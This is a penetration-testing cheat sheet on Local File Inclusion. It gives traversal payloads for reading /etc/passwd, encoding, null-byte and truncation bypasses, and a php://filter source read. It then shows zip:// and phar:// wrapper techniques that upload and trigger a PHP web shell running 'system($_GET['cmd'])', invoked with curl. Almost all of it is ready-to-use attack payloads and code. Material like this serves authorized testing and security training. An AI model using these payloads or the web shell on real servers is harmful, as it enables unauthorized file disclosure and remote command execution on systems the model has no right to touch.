---
description: >-
  an attacker may manipulate these parameters to display the content of any
  local file on the hosting server, leading to a Local File Inclusion (LFI)
  vulnerability.
---

# LFI

#### Wordlists

* [https://github.com/emadshanab/LFI-Payload-List](https://github.com/emadshanab/LFI-Payload-List)
* [https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/LFI/LFI-Jhaddix.txt](https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/LFI/LFI-Jhaddix.txt)

#### Basic payloads

```bash
# Basic LFI
/index.php?language=/etc/passwd

# Path traversal
/index.php?language=../../../../etc/passwd

# Name prefix
/index.php?language=/../../../etc/passwd

# Appproved Path
/index.php?language=./languages/../../../../etc/passwd
```

#### Bypasses

```bash
# Basic bypass
/index.php?language=....//....//....//....//etc/passwd

# URL encoded
/index.php?language=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64

# Appended extension
/index.php?language=non_existing_directory/../../../etc/passwd/./././.[./ REPEATED ~2048 times]

# Null byte
/index.php?language=../../../../etc/passwd%00

# Read base64 with php filter
/index.php?language=php://filter/read=convert.base64-encode/resource=config
```

### PHP wrappers



{% hint style="info" %}
Its possible to use a .zip file  and use the phar wrapper. Create a .php file with a payload and zip it. Then upload /?page=phar://uploads/payload.zip/payload\&cmd=id&#x20;
{% endhint %}

<details>

<summary>zip://</summary>

Wen upload file is possible

```bash
# Create payload
echo "<?php system($_GET['cmd']); ?>" > payload.php
# Zip zip payload.zip payload.php
zip payload.zip payload.php

# Execute commands
/?page=zip://uploads/payload.zip/payload.php&cmd=id 
# Could be possible without extension
/?page=zip://uploads/payload.zip/payload&cmd=id 
```

</details>

<details>

<summary>phar://</summary>

Uploading files is needed

```php
<?php
$phar = new Phar('shell.phar');
$phar->startBuffering();
$phar->addFromString('shell.txt', '<?php system($_GET["cmd"]); ?>');
$phar->setStub('<?php __HALT_COMPILER(); ?>');

$phar->stopBuffering();
```

Compile script into .phar file

```php
php --define phar.readonly=0 shell.php && mv shell.phar shell.jpg
```

Trigger filie

```bash
curl --user-agent "PENTEST" "$URL/?parameter=phar://./shell.jpg%2Fshell.txt&cmd=id"
```

</details>

For more wrappers:

[https://www.thehacker.recipes/web/inputs/file-inclusion/lfi-to-rce/php-wrappers-and-streams](https://www.thehacker.recipes/web/inputs/file-inclusion/lfi-to-rce/php-wrappers-and-streams)
